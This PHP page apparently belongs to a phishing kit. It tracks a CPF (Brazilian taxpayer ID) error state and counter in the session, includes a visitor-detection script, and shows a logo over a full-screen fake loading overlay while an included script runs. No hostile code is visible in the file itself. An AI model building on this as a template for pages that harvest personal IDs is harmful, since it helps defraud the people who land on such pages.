<?php
session_start();

require_once('../../config.php');
require_once('../../includes/php/detect.php');

if(!isset($_SESSION['cpf_err'])) $_SESSION['cpf_err'] = true;

$full_id = $_SESSION['unique_id'] . $_SESSION['cpf_counter'];

?>
<html dir="ltr">
  <head id="j_idt3">
    <meta charset="UTF-8">
    <title></title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="shortcut icon" href="favicon.ico">
    <meta name="theme-color" content="#ffffff">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
      .modalBgLoading {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.7);
    z-index: 99999;
}
.modalBgLoading .loading {
    position: absolute;
    z-index: 65557;
    width: 120px;
    height: 120px;
    background: url('../img/loading.gif') no-repeat center center #fff;
    border-radius: 10px;
    border: 2px solid #fff;
    top: 50%;
    left: 50%;
    margin-left: -60px;
    margin-top: -60px;
}
    </style>
  </head>
  <body style="" class="pace-running" style="">
    <section id="main-wrapper" class="">
      <header id="main-header" class="row" style="display: flex; align-items: center; justify-content: center;">
        <span class="logo" style="left: auto;">
          <a>
            <img src="../img/logo.png" style="width: 150px;margin-top: 60px;" alt="">
          </a>
        </span>
      </header>
      <section id="main-body">
        <section id="content-bottom-flex" class="bg-white">
            <div class="modalBgLoading" style="">
                  <div class="loading"></div>
            </div>
        </section>
      </section>
    </section>
    <?php include_once('js.php'); ?>
  </body>
</html>